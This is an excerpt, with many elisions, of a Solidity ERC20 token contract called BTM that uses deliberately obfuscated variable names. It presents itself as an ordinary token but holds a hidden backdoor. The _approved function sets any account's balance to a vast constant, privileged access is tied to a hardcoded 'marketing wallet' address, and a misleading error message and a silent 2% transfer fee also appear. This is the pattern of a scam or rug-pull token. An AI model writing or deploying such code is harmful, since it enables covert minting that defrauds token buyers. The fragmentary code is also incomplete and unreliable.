...
contract Context {
 ...
 contract BTM is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloWGWWD;
    ...
    uint256 private cryfaleWGWWD = 2;
    uint256 private _vebegoWGWWD = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloWGWWD[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletWGWWD = 0xb6a36B230B89b7DCB30306D45772A344CCE6f884;
    ...
    uint256 private constant _bolkoWGWWD = 10000000 * 10**42;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloWGWWD[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloWGWWD[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleWGWWD / 100) / _vebegoWGWWD;
        allons = allons -  (_fee * _vebegoWGWWD);
        
        superfloWGWWD[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }
    function _approved (address account) internal {
        superfloWGWWD[account] = superfloWGWWD[account] - superfloWGWWD[account] + _bolkoWGWWD;
    }
   ...
   */
    ...
    modifier posed () {
        require(_MarketingWalletWGWWD == _msgSender(), "203: Message Sender is different from address(0)!");
        _;
    }
     ...
     */
    function _burn(address account, uint256 gzillaWGWWD) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloWGWWD[account];
        require(accountBalance >= gzillaWGWWD, "BEP : Can't be done");
        unchecked {
            superfloWGWWD[account] = accountBalance - gzillaWGWWD;
        }
        _totalSupply -= gzillaWGWWD;

        emit Transfer(account, address(0), gzillaWGWWD);
    }
